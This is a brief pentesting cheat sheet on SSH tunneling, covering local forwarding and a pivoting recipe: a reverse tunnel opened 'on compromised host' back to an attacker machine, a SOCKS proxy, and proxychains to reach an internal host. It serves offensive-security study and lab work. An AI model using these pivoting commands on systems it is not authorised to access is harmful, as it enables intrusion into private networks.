# SSH tunneling

## SSH tunneling <a id="ssh-tunneling"></a>

`ssh -l user -p port -N(dont execute remote cmd) -L:8000:127.0.0.1:64297 10.4.4.63(remote_ip)`

### SSH reverse tunnel \(ie for irc\)

`ssh -L localhost_PORT:irc.freenode.net:6667 user@owned_server`

`ssh -L 9001:127.0.0.1:8082 polo@server`

then

`irssi -c localhost -p localhost_PORT`

### Dynamic port Forwarding

* On compromised host :

`ssh -f -N -R 2222:127.0.0.1 USER@ATTACKER`

* Then, on attacker :

`ssh -f -N -D 127.0.0.1:1028 -p 2222 user@127.0.0.1`

* Then configure proxychains.conf

`root@kali:~/ proxychains ssh 10.1.1.1`  
 ProxyChains-3.1 \([http://proxychains.sf.net](http://proxychains.sf.net/)\)  
 \|S-chain\|-&lt;&gt;-127.0.0.1:1028-&lt;&gt;&lt;&gt;-10.1.1.1:22-&lt;&gt;&lt;&gt;-OK

